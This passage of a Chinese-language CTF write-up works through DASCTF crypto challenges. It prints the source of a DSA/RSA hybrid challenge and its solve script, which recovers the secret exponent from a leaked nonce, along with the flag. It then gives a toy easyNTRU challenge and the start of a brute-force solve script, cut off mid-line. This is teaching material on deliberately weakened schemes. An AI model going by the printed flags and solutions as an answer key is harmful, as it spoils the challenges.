class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>r <span class="token operator">=</span> <span class="token function">powmod</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> k<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> q</pre></td></tr><tr><td data-num="22"></td><td><pre>s <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">+</span> x<span class="token operator">*</span>r<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">invert</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token operator">%</span> q</pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>c <span class="token operator">=</span> <span class="token function">powmod</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> x<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> h<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s<span class="token punctuation">,</span> c<span class="token punctuation">,</span> k<span class="token punctuation">,</span> sep<span class="token operator">=</span><span class="token string">','</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre># p <span class="token operator">=</span> <span class="token number">94515040220263097875872541668071470619435707358211716562219917331797767488022053087267566586709944785329708571559126640339609375166385904147189950035630910404534642622114804635856314928438531544553236458244225698694846607333226704467932079712515971615643868209281460429629880920550469170449935295454629293399</span></pre></td></tr><tr><td data-num="29"></td><td><pre># q <span class="token operator">=</span> <span class="token number">1001535514136994695529636128311212301250326767869</span></pre></td></tr><tr><td data-num="30"></td><td><pre># g <span class="token operator">=</span> <span class="token number">89288700225171676599759774184146798321191748739703246395529001979988401303800066044674449834184095667747898974375431700503800142840899194492182057885675147681600217979466719692984863330298347742657472936559041930489702116255999412448996714923112824244267910808782794442895518685864174817501040060680962447941</span></pre></td></tr><tr><td data-num="31"></td><td><pre># y <span class="token operator">=</span> <span class="token number">93887528695360292524813814240190328732283663255426806128197957720674496260060703595933676082882204724501085633424942582304707395449222043328895852812543576418567716781870179606049899540449729036771290550645770978667075821043797569255787271932556218014920373462882329802597672026806552417735660553144344650642</span></pre></td></tr><tr><td data-num="32"></td><td><pre># h <span class="token operator">=</span> <span class="token number">775593521305134275967472254218401264703166138817</span></pre></td></tr><tr><td data-num="33"></td><td><pre># r <span class="token operator">=</span> <span class="token number">75084117510316201869105133948164969652170742276</span></pre></td></tr><tr><td data-num="34"></td><td><pre># s <span class="token operator">=</span> <span class="token number">599417004454208825884865529281453774324093134827</span></pre></td></tr><tr><td data-num="35"></td><td><pre># c <span class="token operator">=</span> <span class="token number">94203926294365722030261882520165826558476099177297861176153811285238289485953276649563642144753132730431066372867407177248194182778827143183520415437355921352580608448713381897280433120409711633310458263502217605470824497215111936036532237050330222480782799188409969149722885261258984444311562364318406725475829089368796269160936194172040318140462371217663</span></pre></td></tr><tr><td data-num="36"></td><td><pre># k <span class="token operator">=</span> <span class="token number">208672457767877303895327222020982963931779123819</span></pre></td></tr></table></figure><p>题给的变量很多，开始拿到这题的时候愣住了，但是不难看出来 x 是这题的关键，求出 x 即可正常解 RSA。</p>
<p>赛后看了 4xwi11 佬的博客才发现，这题真的不难 QAQ</p>
<p>告诉了</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>s <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">+</span> x<span class="token operator">*</span>r<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">invert</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token operator">%</span> q</pre></td></tr></table></figure><p>根据这一加密就不难推测出 x</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">*</span> k <span class="token operator">-</span>h<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">invert</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>q</pre></td></tr></table></figure><p>呜呜呜，佬说简单推导都不算。</p>
<p>贴上 exp：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>from gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>p <span class="token operator">=</span> <span class="token number">94515040220263097875872541668071470619435707358211716562219917331797767488022053087267566586709944785329708571559126640339609375166385904147189950035630910404534642622114804635856314928438531544553236458244225698694846607333226704467932079712515971615643868209281460429629880920550469170449935295454629293399</span></pre></td></tr><tr><td data-num="5"></td><td><pre>q <span class="token operator">=</span> <span class="token number">1001535514136994695529636128311212301250326767869</span></pre></td></tr><tr><td data-num="6"></td><td><pre>g <span class="token operator">=</span> <span class="token number">89288700225171676599759774184146798321191748739703246395529001979988401303800066044674449834184095667747898974375431700503800142840899194492182057885675147681600217979466719692984863330298347742657472936559041930489702116255999412448996714923112824244267910808782794442895518685864174817501040060680962447941</span></pre></td></tr><tr><td data-num="7"></td><td><pre>y <span class="token operator">=</span> <span class="token number">93887528695360292524813814240190328732283663255426806128197957720674496260060703595933676082882204724501085633424942582304707395449222043328895852812543576418567716781870179606049899540449729036771290550645770978667075821043797569255787271932556218014920373462882329802597672026806552417735660553144344650642</span></pre></td></tr><tr><td data-num="8"></td><td><pre>h <span class="token operator">=</span> <span class="token number">775593521305134275967472254218401264703166138817</span></pre></td></tr><tr><td data-num="9"></td><td><pre>r <span class="token operator">=</span> <span class="token number">75084117510316201869105133948164969652170742276</span></pre></td></tr><tr><td data-num="10"></td><td><pre>s <span class="token operator">=</span> <span class="token number">599417004454208825884865529281453774324093134827</span></pre></td></tr><tr><td data-num="11"></td><td><pre>c <span class="token operator">=</span> <span class="token number">94203926294365722030261882520165826558476099177297861176153811285238289485953276649563642144753132730431066372867407177248194182778827143183520415437355921352580608448713381897280433120409711633310458263502217605470824497215111936036532237050330222480782799188409969149722885261258984444311562364318406725475829089368796269160936194172040318140462371217663</span></pre></td></tr><tr><td data-num="12"></td><td><pre>k <span class="token operator">=</span> <span class="token number">208672457767877303895327222020982963931779123819</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="15"></td><td><pre>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>#s <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">+</span> x<span class="token operator">*</span>r<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">invert</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> q<span class="token punctuation">)</span> <span class="token operator">%</span> q</pre></td></tr><tr><td data-num="17"></td><td><pre>x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">*</span> k <span class="token operator">-</span>h<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">invert</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>q</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">bit_length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>d <span class="token operator">=</span> <span class="token function">invert</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>m <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">long_to_bytes</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>运行即可得到：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">160</span></pre></td></tr><tr><td data-num="2"></td><td><pre>b<span class="token string">'DASCTF&#123;1d6f9460a596a4b38acc7263ea37b84d&#125;'</span></pre></td></tr></table></figure><h2 id="easyntru"><a class="anchor" href="#easyntru">#</a> easyNTRU</h2>
<p>附件信息：</p>
<p>easyNTRU.sage：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>from Crypto<span class="token punctuation">.</span>Hash <span class="token keyword">import</span> <span class="token constant">SHA3_256</span></pre></td></tr><tr><td data-num="2"></td><td><pre>from Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> <span class="token constant">AES</span></pre></td></tr><tr><td data-num="3"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad</pre></td></tr><tr><td data-num="4"></td><td><pre>from secret <span class="token keyword">import</span> flag</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre># parameters</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token constant">N</span> <span class="token operator">=</span> <span class="token number">10</span></pre></td></tr><tr><td data-num="8"></td><td><pre>p <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="9"></td><td><pre>q <span class="token operator">=</span> <span class="token number">512</span></pre></td></tr><tr><td data-num="10"></td><td><pre>d <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="11"></td><td><pre>assert q<span class="token operator">></span><span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">*</span>d<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>p</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token constant">R</span><span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> <span class="token constant">ZZ</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>#d1 1s and #d2 <span class="token operator">-</span>1s</pre></td></tr><tr><td data-num="16"></td><td><pre>def <span class="token constant">T</span><span class="token punctuation">(</span>d1<span class="token punctuation">,</span> d2<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    assert <span class="token constant">N</span> <span class="token operator">>=</span> d1<span class="token operator">+</span>d2</pre></td></tr><tr><td data-num="18"></td><td><pre>    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>d1 <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>d2 <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token constant">N</span><span class="token operator">-</span>d1<span class="token operator">-</span>d2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">shuffle</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">R</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>def <span class="token function">invertModPrime</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    Rp <span class="token operator">=</span> <span class="token constant">R</span><span class="token punctuation">.</span><span class="token function">change_ring</span><span class="token punctuation">(</span><span class="token function">Integers</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">quotient</span><span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token constant">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">R</span><span class="token punctuation">(</span><span class="token function">lift</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> <span class="token function">Rp</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>def <span class="token function">convolution</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> g<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">return</span> <span class="token punctuation">(</span>f<span class="token operator">*</span>g<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token constant">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>def <span class="token function">liftMod</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    g <span class="token operator">=</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> q<span class="token comment">//2) % q) - q//2 for i in range(N))</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">R</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>def <span class="token function">polyMod</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    g <span class="token operator">=</span> <span class="token punctuation">[</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">%</span>q <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token constant">N</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">R</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>def <span class="token function">invertModPow2</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    assert q<span class="token punctuation">.</span><span class="token function">is_power_of</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    g <span class="token operator">=</span> <span class="token function">invertModPrime</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">while</span> <span class="token literal-property property">True</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        r <span class="token operator">=</span> <span class="token function">liftMod</span><span class="token punctuation">(</span><span class="token function">convolution</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token keyword">if</span> r <span class="token operator">==</span> <span class="token number">1</span><span class="token operator">:</span> <span class="token keyword">return</span> g</pre></td></tr><tr><td data-num="43"></td><td><pre>        g <span class="token operator">=</span> <span class="token function">liftMod</span><span class="token punctuation">(</span><span class="token function">convolution</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span><span class="token number">2</span> <span class="token operator">-</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre>def <span class="token function">genMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    result <span class="token operator">=</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token function">randrange</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token constant">N</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">R</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre>def <span class="token function">genKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="50"></td><td><pre>  <span class="token keyword">while</span> <span class="token literal-property property">True</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token keyword">try</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="52"></td><td><pre>      f <span class="token operator">=</span> <span class="token constant">T</span><span class="token punctuation">(</span>d<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>      g <span class="token operator">=</span> <span class="token constant">T</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>      Fp <span class="token operator">=</span> <span class="token function">polyMod</span><span class="token punctuation">(</span><span class="token function">invertModPrime</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>      Fq <span class="token operator">=</span> <span class="token function">polyMod</span><span class="token punctuation">(</span><span class="token function">invertModPow2</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>      <span class="token keyword">break</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token literal-property property">except</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="58"></td><td><pre>      <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="59"></td><td><pre>  h <span class="token operator">=</span> <span class="token function">polyMod</span><span class="token punctuation">(</span><span class="token function">convolution</span><span class="token punctuation">(</span>Fq<span class="token punctuation">,</span> g<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>  <span class="token keyword">return</span> h<span class="token punctuation">,</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> g<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre>def <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="63"></td><td><pre>  e <span class="token operator">=</span> <span class="token function">liftMod</span><span class="token punctuation">(</span>p<span class="token operator">*</span><span class="token function">convolution</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token constant">T</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> m<span class="token punctuation">,</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>  <span class="token keyword">return</span> e</pre></td></tr><tr><td data-num="65"></td><td><pre></pre></td></tr><tr><td data-num="66"></td><td><pre># Step <span class="token number">1</span></pre></td></tr><tr><td data-num="67"></td><td><pre>h<span class="token punctuation">,</span> secret <span class="token operator">=</span> <span class="token function">genKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre>m <span class="token operator">=</span> <span class="token function">genMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre>e <span class="token operator">=</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> h<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'h = %s'</span> <span class="token operator">%</span> h<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'e = %s'</span> <span class="token operator">%</span> e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre></pre></td></tr><tr><td data-num="74"></td><td><pre># Step <span class="token number">2</span></pre></td></tr><tr><td data-num="75"></td><td><pre>sha3 <span class="token operator">=</span> <span class="token constant">SHA3_256</span><span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="76"></td><td><pre>sha3<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token function">bytes</span><span class="token punctuation">(</span><span class="token function">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre>key <span class="token operator">=</span> sha3<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre></pre></td></tr><tr><td data-num="79"></td><td><pre>cypher <span class="token operator">=</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token constant">AES</span><span class="token punctuation">.</span><span class="token constant">MODE_ECB</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre>c <span class="token operator">=</span> cypher<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token function">pad</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'c = %s'</span> <span class="token operator">%</span> c<span class="token punctuation">)</span></pre></td></tr></table></figure><p>​</p>
<p>out:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>h <span class="token operator">=</span> <span class="token number">39</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">9</span> <span class="token operator">+</span> <span class="token number">60</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">349</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token number">268</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">144</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">5</span> <span class="token operator">+</span> <span class="token number">469</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">449</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">165</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">248</span><span class="token operator">*</span>x <span class="token operator">+</span> <span class="token number">369</span></pre></td></tr><tr><td data-num="2"></td><td><pre>e <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">144</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">9</span> <span class="token operator">-</span> <span class="token number">200</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token number">248</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">85</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">5</span> <span class="token operator">+</span> <span class="token number">102</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">167</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">30</span><span class="token operator">*</span>x<span class="token operator">^</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">203</span><span class="token operator">*</span>x <span class="token operator">-</span> <span class="token number">78</span></pre></td></tr><tr><td data-num="3"></td><td><pre>c <span class="token operator">=</span> b<span class="token string">'\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96="f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80'</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly80eHdpMTEuZ2l0aHViLmlvL3Bvc3RzL2EyYjZlY2QzLw==">学习 4WXi11 佬的 NTRU 系统</span></p>
<p>exp:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token hashbang comment">#!/usr/bin/env sage</span></pre></td></tr><tr><td data-num="2"></td><td><pre># <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token operator">:</span> utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="3"></td><td><pre>from Crypto<span class="token punctuation">.</span>Hash <span class="token keyword">import</span> <span class="token constant">SHA3_256</span></pre></td></tr><tr><td data-num="4"></td><td><pre>from Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> <span class="token constant">AES</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> sys</pre></td></tr><tr><td data-num="6"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> unpad</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token constant">N</span> <span class="token operator">=</span> <span class="token number">10</span></pre></td></tr><tr><td data-num="9"></td><td><pre>p <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="10"></td><td><pre>q <span class="token operator">=</span> <span class="token number">512</span></pre></td></tr><tr><td data-num="11"></td><td><pre>d <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token constant">R</span><span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> <span class="token constant">ZZ</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>c <span class="token operator">=</span> b<span class="token string">'\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96="f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80'</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>table <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token literal-property property">table</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">for</span> i2 <span class="token 